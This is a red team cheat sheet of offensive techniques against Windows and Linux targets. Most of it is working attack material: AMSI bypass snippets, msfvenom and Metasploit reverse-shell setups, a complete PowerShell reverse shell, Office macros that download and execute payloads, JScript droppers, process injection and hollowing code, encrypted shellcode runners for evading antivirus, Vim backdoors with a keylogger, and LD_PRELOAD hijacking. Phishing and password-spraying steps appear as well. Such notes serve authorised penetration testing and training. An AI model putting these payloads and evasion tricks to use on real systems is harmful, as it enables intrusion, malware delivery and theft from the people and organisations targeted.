# Red Team Cheat Sheet

## Table of Contents
1. Utilities
2. Resources
3. Reconnaissance
4. Exploitation
5. Post Exploitation
6. Lateral Movement
7. Full Control

## Resources

### General
- [PayloadAlltheThingsAD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [iRedTeam](https://www.ired.team/)
- [HackTricks](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)
- [LOLBAS](https://lolbas-project.github.io/)
- [Malleable C2 Profile Collection](https://github.com/BC-SECURITY/Malleable-C2-Profiles)
- [PowerSploit - Active Fork (ZeroDayLab)](https://github.com/ZeroDayLab/PowerSploit)

### Guides
- [Custom BloodHound Queries](https://github.com/hausec/Bloodhound-Custom-Queries)
- [Impacket Guide](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)
- [Attacking Domain Trusts (harmj0y)](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [Breaking Forest Trusts (harmj0y)](http://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
- [Lateral Movement (specterOps)](https://posts.specterops.io/offensive-lateral-movement-1744ae62b14f)
- [Offensive Kerberose (specterOps)](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [How Attackers Use Silver Tickets](https://adsecurity.org/?p=2011)
- [Active Directory Exploitation Cheat Sheet (S1ckB0y1337)](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
- [Cobalt Strike Cheat Sheet (S1ckB0y1337)](https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet)
- [harmj0y's PowerView Tricks Cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

---

## 1. Utilities

### Base64 Encoding

base64.ps1

```
$input_str = $Args[0]
Write-Host "Input:" $input_str

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($input_str)
$EncodedText =[Convert]::ToBase64String($Bytes)
Write-Host $EncodedText
```

base64.sh

```
#!/bin/bash

echo -n $1 | iconv -f UTF8 -t UTF16LE | base64 -w 0 ; echo
```

Windows save to file

```
[System.IO.File]::WriteAllBytes("C:\Users\<user>\Desktop\da.kirbi", [System.Convert]::FromBase64String("doIFGjCCBRagAwIBBaEDAgEWooIE[...snip...]E6A0Z3QbDUNZQkVSQk9USUMuSU8="))

[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\windows\tasks\golden.kirbi")) | Out-File -Filepath c:\windows\tasks\golden.kirbi.b64
```

### SSL Listeners

#### Generate Self-Signed Certificate

Generate

```
# first change "CipherString=DEFAULT@SECLEVEL=2" to "CipherString=DEFAULT" in /etc/ssl/openssl.conf
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
```

Use with msf

```
# generate required file
cat priv.key cert.crt > nasa.pem

# use
set HandlerSSLCert /home/kali/self_cert/yolo.pem
```

Use with Covenant

```
# Convert to PFX
openssl pkcs12 -inkey skeler.pem -in cert.crt -export -out skeler.pfx
```

#### LetsEncrypt

Generate

```
certbot certonly --agree-tos --standalone -m goodguy@gmail.com -d fw.vaultsec.xyz
```

Use with metasploit

```
cat privkey.pem cert.pem
```

Use with Covenant

```
# Feed the `.pfx` file to Cov in the web interface, set the password.
cd /etc/letsencrypt/live/fw.vaultsec.xyz/

# set & remember the password
openssl pkcs12 -export -out certificate.pfx -inkey privkey.pem -in cert.pem -certfile chain.pem
```

### Create Network Share

```
beacon> shell mkdir c:\likes

beacon> shell net share DataShare=c:\likes

# access
> dir \\host\datashare
```

---

## 2. Reconnaissance

### DNS

Enum target domain.

```
# hosted
$ dig vault.io
x.x.x.x
x.x.x.x

# IP info
$ whois x.x.x.x
```

Hunt subdomains.

```
# use dnscan
$ python3 dnscan.py -d vault.io -w subdomains-1000.txt
[*] Processing domain vault.io
[*] Using system resolvers ['192.168.168.2']

[+] Getting nameservers
x.x.x.x - adi.ns.cloudflare.com
x.x.x.x - adi.ns.cloudflare.com
[...]
```

#### Resources
- https://github.com/rbsec/dnscan
- https://github.com/tomnomnom/assetfinder

### Phishing

Common options:
- mal attachment
- link to mal doc
- link to MiTM reverse http proxy

Check weak email security.

```
# use spoofcheck
$ ./spoofcheck.py vault.io
[+] vault.io has no SPF record!
[*] No DMARC record found. Looking for organizational record
[+] No organizational DMARC record
[+] Spoofing possible for vault.io!
```

#### Resources
- https://github.com/BishopFox/spoofcheck
- https://github.com/kgretzky/evilginx2
- https://github.com/drk1wi/Modlishka

### Password Spraying

Common patterns:
- MonthYear
- SeasonYear
- DayDate

#### Address Generation

Address format

```
# collect names into text file
$ cat names.txt
Joe Boden
Larry Mickles
Sarah Black
[...]

$ /opt/namemash/namemash.py employees.txt | sed 's/$/@vault.io/g'
joe.boden@vault.io
jboden@vault.io
boden.joe@vault.io
[...]
```

##### Resources
- https://gist.github.com/superkojiman/11076951

#### Spray

```
# Using atomizer
/opt/SprayingToolkit/atomizer.py owa mail.vault.io January2020 emails.txt

# Using MailSniper
PS > ipmo C:\tools\MailSniper\MailSniper.ps1
PS > Invoke-PasswordSprayOWA -ExchHostname mail.vault.io -UserList .\known-emails.txt -Password Spring2021
```

Other useful MailSniper functions
- Get-GlobalAddressList
- Invoke-SelfSearch

Depending on office version, verify valid accounts with `auxiliary/scanner/http/owa_login`

#### Resources
- http://weakpasswords.net/
- https://github.com/dafthack/MailSniper
- https://github.com/byt3bl33d3r/SprayingToolkit
- https://gist.github.com/superkojiman/11076951
- https://github.com/digininja/CeWL
- https://github.com/tomnomnom/comb
- https://github.com/ropnop/kerbrute

---

## 4. Exploitation

### Delivery

#### Bitsadmin Download

Use bitsadmin to download. *Note, requires full destination path; Python server cannot support required protocols*

```
# encode the payload with certutil 
bitsadmin /Transfer myJob http://192.168.49.83/encoded.txt c:\users\user\desktop\enc.txt
```

#### Certutil Encode/Decode

Use certutil to base64 encode and decode.

```
# encode
certutil -encode input.exe output.txt

# decode
certutil -decode input.txt output.exe
```

#### PowerShell Convert Assembly to Hex

```
$assemblyFile = "assem.dll"
$stringBuilder = New-Object -Type System.Text.StringBuilder
$fileStream = [IO.File]::OpenRead($assemblyFile)
while (($byte = $fileStream.ReadByte()) -gt -1) {
    $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}
$stringBuilder.ToString() -join "" | Out-File c:\Tools\cmdExec.txt
```

#### Powershell Download via Web Proxy

Leveraging the user's proxy

```
$wc = New-Object system.net.webclient
$wc.Headers.Add('User-Agent', "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36")
$wc.DownloadString("http://192.168.49.83/run4.ps1")
```

Leveraging another user's proxy as SYSTEM

```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.49.83/run5.ps1")
```

#### Powershell Download Custom User Agent

```
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

#### Powershell DLL Reflective Runner

```
$dll = (new-object net.webclient).DownloadData("http://192.168.49.83/ClassLibrary1.dll")
[System.Reflection.Assembly]::Load($dll)
[ClassLibrary1.Class1]::runner()
```

#### Invoke-ReflectivePEInjection.ps1

```
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.83/met.dll')
$procid = (Get-Process -Name explorer).Id
IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.83/ref.ps1')
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

#### Invoke-Sharploader Reflective PE Injection

```
(new-object net.webclient).downloadstring('http://192.168.49.83/psh/Invoke-Sharpcradle/Invoke-Sharpcradle.ps1')|iex; invoke-sharpcradle -uri http://192.168.49.83/Rubeus.exe -argument1 "kerberoast"
```

### Powershell AMSI Bypass

#### Powershell AMSI Bypass via "amsiContext" Header Corruption

```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

#### Powershell AMSI Bypass via "amsiInitFailed" Corruption

```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
```

#### Powershell "AmsiOpenSession" AMSI Binary Patch Bypass

[Full Source](../src/powershell/AmsiOpenSession-Patch-amsi-bypass.ps1)

```
[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
# restore
$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
```

#### Powershell "AmsiScanBuffer" AMSI Binary Patch Bypass

[Full Source](../src/powershell/AmsiScanBuffer-Patch-amsi-bypass.ps1)

```
$z1 = 'AmsiS'
$z2 = 'canB'
$z3 = 'uffer'
$z = $z1 + $z2 + $z3
[IntPtr]$funcAddr = LookupFunc amsi.dll $z
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32],[UInt32].MakeByRefType()) ([Bool])))
# in rasta's , arg #2 is "[uint32]5"
$vp.Invoke($funcAddr, [uint32]5, 0x40, [ref]$oldProtectionBuffer)

# original: $buf = [Byte[]] (0x48, 0x31, 0xC0)
$buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)

# in rasta's, last arg is 6
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 6)
```

### Metasploit Payloads

#### Windows Listeners

```
# rev https meterp x64
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.49.83; set LPORT 443; set EXITFUNC thread; set verbose true; exploit -j;"

# Encoded staged rev https meterp x64
msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST 192.168.49.83; set LPORT 443; set EXITFUNC thread; set verbose true; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit -j"
```

#### Linux Listeners

```
msfconsole -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST 192.168.49.83; set LPORT 80; set verbose true; exploit -j"
```

#### RC Files

Alternatively, store the handler/listener setup in a [configuration](../src/misc/meterp-rev-https-x64.rc).

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 192.168.49.83
set LPORT 443
set EXITFUNC thread
set verbose true
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.42"
set HttpServerName Nginx
set HandlerSSLCert /home/sysadm/osep/modules/9-network-filters/skeler.pem
set HttpUnknownRequestResponse "<html><body><h1>zzz</h1></body></html>"
set HttpCookie "PHPSESS: 123913"
set HttpReferer "https://192.168.49.83:8080/logout?t=12313"
exploit -j
```

#### Windows Payload Generation

```
# add local admin
msfvenom -p windows/x64/exec CMD='cmd.exe /k "net user /add likes Passw0rd! && net localgroup administrators likes /add && exit"' -o adduser2.exe -f exe

# reverse tcp
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.83 LPORT=444 -f exe -o tl.exe

# staged powershell meterp x86
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 EXITFUNC=thread -f ps1

# staged rev https meterp x64
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 EXITFUNC=thread -f exe -o met.exe

# Encoded staged rev https meterp x64
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 EXITFUNC=thread -f raw -o met.bin -e x64/xor_dynamic

# dll injection
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LHOST=443 -f dll -o met.dll

# no uac msi - launch remote- msiexec /qn /i http://<attacker>/payload.msi
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 EXITFUNC=thread -f msi-nouac -o meterp64-nouac.msi 

# domain fronting
msfvenom -p windows/x64/meterpreter_reverse_https HttpHostHeader=cdn123.vaultcdn.com LHOST=good.com LPORT=443 -f exe > https-df.exe
```

#### Linux Payload Generation

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.49.83 LPORT=80 PrependFork=true -f c
```

#### Powershell Reverse Shell

```
$lf=[Ref].Assembly.GetTypes();Foreach($up in $lf) {if ($up.Name -like "*iUtils") {$c=$up}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true);$TCPClient = New-Object Net.Sockets.TCPClient('192.168.49.83', 80);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
```

### Initial Compromise

#### HTML Smuggling

Can be used to force download after coercing victim to visit maliciou page. Note, victim is still required to run the downloaded payload manually. 

Base64 encode the malicious file and paste it into the following JavaScript. Then host the file and trick victim into visiting page. 

[Full Source](../src/misc/Stub-HtmlSmuggling.html)

```
var a = document.createElement('a');
document.body.appendChild(a);
a.style = 'display: none';
var url = window.URL.createObjectURL(blob);
a.href = url;
a.download = fileName;
a.click();
window.URL.revokeObjectURL(url);
```

#### VBA

Microsoft Office products such as Excel and Word can be exploited to execute arbitrary VBA via document Macros. 

**Important** When creating a new macro, ensure to change the "Macros in" value to "this document" to ensure the macro is embedded into the document even on another system. 

##### Office VBA PowerShell Download & Exec File

Use Powershell to download a malicious file, such as an executable, and execute it. Uses WScript Shell. [Full source](../src/visualbasic/PshDownloadExec.vb).

```
Sub MyMacro()
	Dim str As String
	str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
	Shell str, vbHide
	Dim exePath As String
	exePath = ActiveDocument.Path + "\msfstaged.exe"
	Wait (2)
	Shell exePath, vbHide
End Sub
```

##### Office VBA Text Replace Macro

Use for appearances- find & replace text within the document to further coerce the victim to enable document content. 

```
Sub Document_Open()
    SubPage
End Sub

Sub AutoOpen()
    SubPage
End Sub

Sub SubPage()
    ActiveDocument.Content.Select
    Selection.Delete
    ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert Where:=Selection.Range, RichText:=True
End Sub
```

##### Office Shellcode Runners

Shellcode can be executed directly in the document macro via VBA by leveraging the Win32 API. 

###### Office MSF Shellcode Generation

```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
```

###### Office VBA In Memory Shellcode Exec via CreateThread

CreateThread can be used to execute the shellcode. Import the required Win32 APIs, use VirtualAlloc to place the shellcode, and CreateThread to execute. *Note, when the Word instance is closed, so to is the shell.*

[Full Source](../src/visualbasic/InMemoryWin32CreateThread.vb)

```
buf = Array(232,[...],213)

addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

For counter = LBound(buf) To Ubound(buf)
    data = buf(counter)
    res = RtlMoveMemory(addr + counter, data, 1)
Next counter

res = CreateThread(0, 0, addr, 0, 0, 0)
```

##### Office VBA Shellcode Runner via PowerShell

Leverage VBA to execute PowerShell without saving to disk and as a child process. The child process allows the continuation of shellcode even after Word is closed.

Use VBA to download a Powershell script and execute it in memory. Using DllImportAttribute, Powershell can invoke unmanaged dynamic link libraries. 

###### Office MSF Powershell Shellcode Generation

```
sfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f ps1
```

###### Office Powershell Download & Exec

Host the Powershell and execute it via VBA macro

```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.49.83/run.ps1') | IEX"
    Shell str, vbHide
End Sub
```

###### Office Powershell Shellcode Runner via Add-Type Compilation

Use P/Invoke to allocate executable memory via VirtualAlloc, copy shellcode, and execute via CreateThread. *Note, compilation of the Powershell's C# code compilation temporarily writes to disk.*

[Full Source](../src/powershell/ScRunner.ps1)

```
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle = [Kernel32]::CreateThread(0,0,$addr,0,0,0);

[Kernel32]::WaitForSingleObject($tHandle, [uint32]"0xFFFFFFFF")
```

###### Office Powershell Basic Shellcode Runner In Memroy

Add-Type calls csc compiler, writing to disk. Dynamic lookup executes in memory via DelegateType Reflection. 

[Full Source](../src/powershell/ReflectiveScRunner.ps1)

```
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

###### Office Powershell Process Injection Shellcode Runner In Memory

[Full Source](../src/powershell/ReflectiveInject.ps1)

```
$ProcessID = 8308
$hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess), `
(getDelegateType @([UInt32], [bool], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, $false, $ProcessID)
if (!$hProcess)
{
    Throw "Unable to open a process handle for PID: $ProcessID"
}
Write-Host "[+] hProcess: " $hProcess
```

#### Windows Script Host (WSH)

##### Proxy-aware JScript Dropper

```
var url = "http://192.168.49.83/met.exe"
var Object = new ActiveXObject('Msxml2.ServerXMLHTTP.6.0');
Object.setProxy(2,"http://192.168.83.12:3128","");
Object.open('GET', url, false);
Object.send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream')

    Stream.Open();
    Stream.Type = 1; //adTypeBinary
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2); // 2 = overwrite
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

##### Jscript Amsi Enable Bypass

```
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
try{
    var AmsiEnable = sh.RegRead(key);
    if(AmsiEnable!=0){
      throw new Error(1, '');
  }
}catch(e){
    sh.RegWrite(key, 0, "REG_DWORD");
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName,0,1);
    sh.RegWrite(key, 1, "REG_DWORD");
    WScript.Quit(1);
}
```

##### Jscript Amsi Imposter Bypass

```
var filesys= new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');
try
{
    if(filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll")==0)
    {
        throw new Error(1, '');
    }
}
catch(e)
{
    filesys.CopyFile("C:\\Windows\\System32\\wscript.exe", "C:\\Windows\\Tasks\\AMSI.dll");
    sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}"+WScript.ScriptFullName);
    WScript.Quit(1);
}
```

### Process Injection Shellcode Runners

#### Basic Process Injection

Use to inject shellcode into another process using the process ID.

[Full Source](../src/csharp/Inject.cs)

```
byte[] buf = new byte[626] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc...
IntPtr outSize;
WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
```

#### Process Injection via SysCalls

Use Nt* functions to evade AV

[Full Source](../src/csharp/DInvoke-Syscalls.cs)

```
// NtWriteVirtualMemory
stub = Generic.GetSyscallStub("NtWriteVirtualMemory");
NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

var buffer = Marshal.AllocHGlobal(_shellcode.Length);
Marshal.Copy(_shellcode, 0, buffer, _shellcode.Length);
```

#### DLL Process Injection

Inject unmanaged DLL into remote process. *Note, writes DLL to disk.*

[Full Source](../src/csharp/DllInject.cs)

```
String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
String dllName = dir + "\\met.dll";

WebClient wc = new WebClient();
wc.DownloadFile("http://192.168.49.83/met.dll", dllName);

Process[] expProc = Process.GetProcessesByName("explorer");
int pid = expProc[0].Id;

IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
IntPtr outSize;
Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
```

#### Reflective DLL Process Injection

Load unmanaged DLL into remote process *reflectively*.

##### Using Invoke-ReflectivePEInjection.ps1

[Source](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)

```
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

#### Process Hollowing

Create suspended process to inject into.

[Full Source](../src/csharp/Hollow.cs)

```
STARTUPINFO si = new STARTUPINFO();
PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
uint tmp = 0;
IntPtr hProcess = pi.hProcess;
ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
```

### AV Evasion

#### Caesar Encrypted Shellcode

Writing a custom shellcode runner that utilizes Caesar encoded shellcode.

##### C#

[Full Source](../src/csharp/LikesEncoder.cs)

```
byte[] encoded = new byte[buf.Length];

for (int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}
```

#### VBA

```
For i = 0 To UBound(buf)
  buf(i) = buf(i) - 2
Next i
```

#### XOR Encrypted Shellcode

Shellcode can be encrypted using XOR as well.

[Full Source](../src/csharp/stub/Stub-XorEncryptor.cs)

```
for (int i = 0; i < buf.Length; i++)
{
    encoded[i] = (byte)((uint)buf[i] ^ 0xBE);
}
```

### Sleepy Shellcode Runner

A sleep timer can be used to attempt to trick AV.

#### C#

```
DateTime t1 = DateTime.Now;
Sleep(2000);
double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
if (t2 < 1.5)
{
    return;
}
```

#### VBA

```
' sleep
Dim t1 As Date
Dim t2 As Date
Dim time As Long

t1 = Now()
Sleep (2000)
t2 = Now()
time = DateDiff("s", t1, t2)
If time < 2 Then
    Exit Function
End If
```

### Non Emulated APIs

Attempt to bypass detection using a Win32 API that is not well emulated.

#### VirtualAllocExNuma

[Full Source](../src/csharp/stub/Stub-Numa.cs)

```
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4,0);
if (mem == null)
{
    return;
}
```

#### FlsAlloc

[Full Source](../src/csharp/stub/Stub-FlsAlloc.cs)

```
IntPtr mem = FlsAlloc(IntPtr.Zero);
if (mem == null)
{
    return;
}
```

### VBA Macro Stomping

Use [EvilClippy](https://github.com/outflanknl/EvilClippy)

```
EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
```

### VBA Dechained via WMI

Execute as a child process

[Full Source](../src/visualbasic/stub/Stub-DechainedWmi.vb)

```
Sub MyMacro
    strArg = "powershell"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

### VBA Obfuscation

`StrReverse` can be used to obfuscate. Heavily monitored, do not use in more places than once. Keep in its own function and call the function multiple times. 

```
Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub Mymacro()
Dim strArg As String
    strArg = bears("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")
    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

### VBA Decimal Obfuscation

To avoid the use of StrReverse, convert ASCII string to decimal and Caesar encode.

[Encryptor Full Source](../src/powershell/caesar-cradle-encrypter.ps1)

```
[string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
```

[Decryptor Full Source](../src/visualbasic/caesar-cradle-decryptor.vb)

```
Function Nuts(Milk)
Do
  Oatmilk = Oatmilk + Pears(Strawberries(Milk))
  Milk = Almonds(Milk)
  Loop While Len(Milk) > 0
  Nuts = Oatmilk
End Function
```

### VBA Document Name Check

Evade AV that changes the name of the document before scanning.

```
If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
  Exit Function
End If
```

### Vim Backdoors

#### Silent Vimscript Backdoor

```
:silent !source ~/.vimrunscript
```

#### Retaining Backdoor Privileges

```
alias sudo="sudo -E"
```

#### Silent Backdoor Command

```
# .vimrc
:silent !touch /tmp/pwnd
```

#### Vim Plugin Backdoor

Vim will automatically execute a plugin file in the proper location

```
~/.vim/plugin/pwn.vim
```

#### Vim Keylogger

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

### Nix Shellcode Runners

#### Shellcode Compilation

Use execstack

```
gcc -o hack.out hack.c -z execstack
```

#### Basic Shellcode Runner

[Full Source](../src/c/ScRunner.c)

```
int main (int argc, char **argv)
{
    unsigned char buf[] = 
    "\x48\[...]\xe6";
    // run our shellcode
    int (*ret)() = (int(*)())buf;
    ret();
}
```

#### Xor Encrypted Shellcode Runner

##### Xor Encryptor

[Full Source](../src/c/ScXorEncoder.c)

```
char xor_key = 'J';
int payload_length = (int) sizeof(buf);

for (int i=0; i<payload_length; i++)
{
    printf("\\x%02X",buf[i]^xor_key);
}
```

##### Xor Runner

[Full Source](../src/c/ScRunnerXor.c)

```
for (int i=0; i<arraysize-1; i++)
{
    buf[i] = buf[i]^xor_key;
}
int (*ret)() = (int(*)())buf;
```

#### Caesar Encrypted Shellcode Runner

##### Caesar Encryptor

[Full Source](../src/c/ScRunnerCaesar.c)

```
for (int i=0; i<buflen;i++)
{
    printf("\\x%02X",buf[i]+4 & 0xFF);
}
```

##### Caesar Runner

[Full Source](../src/c/ScRunnerCaesar.c)

```
for (int i=0; i<buflen-1;i++)
{
    buf[i] = buf[i]-4 & 0xFF;
}

int (*ret)() = (int(*)())buf;
```

### Nix Shared Library Hijacking

#### LD-LIBRARY_PATH

Compile [shared lib payload](../src/c/stub-shared-lib.c)

```
gcc -z execstack -Wall -fPIC -c -o hax.o hax.c
```

*fPIC tels compiler to use position independent code which is suitable for shared libs because they are loaded in unpredictable memory lcation. -c tells gcc to compile but not link the code*

Create shred lib.

```
gcc -z execstack -shared -Wl,--version-script gpg.map -o libhax.so hax.o
```

Find symbols - copy these into payload

```
readelf --wide -s /lib/x86_64-linux-gnu/libgpg-error.so.0
```

#### LD_PRELOAD

[Payload Full Source](../src/c/evil-geteuid.c)

Compile

```
$ gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c

$ gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
```

Execute

```
export LD_PRELOAD=/home/user/preload/preload/evil_geteuid.so
